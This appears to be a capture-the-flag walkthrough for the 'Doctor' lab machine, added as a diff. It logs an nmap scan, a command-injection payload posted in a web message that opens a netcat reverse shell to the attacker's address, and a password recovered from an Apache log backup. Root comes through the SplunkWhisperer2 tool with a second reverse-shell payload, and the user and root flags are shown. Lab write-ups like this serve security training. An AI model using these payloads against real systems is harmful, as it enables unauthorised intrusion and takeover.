@@ -1,0 +1,86 @@
+Machine Name: Doctor
+IP: 10.10.10.209
+
+Command-line: sudo nmap -A 10.10.10.209
+  Result:
+    PORT     STATE SERVICE  VERSION
+    22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
+    |   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
+    |_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
+    80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
+    |_http-server-header: Apache/2.4.41 (Ubuntu)
+    |_http-title: Doctor
+    8089/tcp open  ssl/http Splunkd httpd
+    | http-robots.txt: 1 disallowed entry
+    |_/
+    |_http-server-header: Splunkd
+    |_http-title: splunkd
+    | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+    | Not valid before: 2020-09-06T15:57:27
+    |_Not valid after:  2023-09-06T15:57:27
+    Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 (90%), Linux 5.0 - 5.3 (90%), Linux 5.4 (90%), Crestron XPanel control system (90%), Linux 5.0 - 5.4 (90%), Linux 5.3 - 5.4 (90%), Linux 2.6.32 (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
+
+
+Attempting a `dirb` scan:
+  Command-line: sudo dirb http://10.10.10.209
+  Result: n/a
+
+Scout info:
+  Scanned site, found "doctors.htb"
+  Added "10.10.10.209    doctors.htb" to /etc/hosts
+  Entered in browser: http://doctors.htb => Redirected to sign in page.
+  Found "Register" page. Registration is:
+  u: uk47@gmail.com
+  p: password
+
+  !!SUCCESSFUL LOGIN!!
+
+
+Attempting a reverse shell:
+Command-line: nc -nlvp 5555
+Entered into New Message/Post: <img src=http://10.10.14.145/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.145'$IFS'5555')>
+Command-line: python3 -c 'import pty;pty.spawn("/bin/bash")'
+Result: !!SUCCESSFUL!!
+
+Entering into "web@doctor:~$"
+
+cd'd into: /var/log/apache2
+  Command-line: ls
+  Result:
+  access.log        access.log.5.gz  error.log.10.gz  error.log.5.gz
+  access.log.1      access.log.6.gz  error.log.11.gz  error.log.6.gz
+  access.log.10.gz  access.log.7.gz  error.log.12.gz  error.log.7.gz
+  access.log.11.gz  access.log.8.gz  error.log.13.gz  error.log.8.gz
+  access.log.12.gz  access.log.9.gz  error.log.14.gz  error.log.9.gz
+  access.log.2.gz   backup           error.log.2.gz   other_vhosts_access.log
+  access.log.3.gz   error.log        error.log.3.gz
+  access.log.4.gz   error.log.1      error.log.4.gz
+
+"cat backup" command resulted in a plethora of information. To sift through I entered the command:
+grep -r password?email
+Result: backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
+
+Command-line: su shaun
+Password: Guitar123
+Result: !!SUCCESSFUL!!
+Command-line: cat /home/shaun/user.txt
+Result: 30edf173f843f29319b7248429a42705
+
+!!USER OWNED!!
+
+Command-line: sudo -l
+Password: Guitar123
+Result: "Sorry, user shaun may not run sudo on doctor."
+
+
+Browser Search: "splunkd privilege escalation"
+git clone https://github.com/cnotin/SplunkWhisperer2.git
+Command-line: python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.145 --username shaun --password Guitar123 --payload "nc.traditional -e/bin/sh '10.10.14.145' '4444'"
+Result: Root privileges gained.!!SUCCESSFUL!!
+root@doctor:
+Command-line: cat /root/root.txt
+Result: 3221655973c31be612f20b07da3b754c
+
+!!ROOT OWNED!!
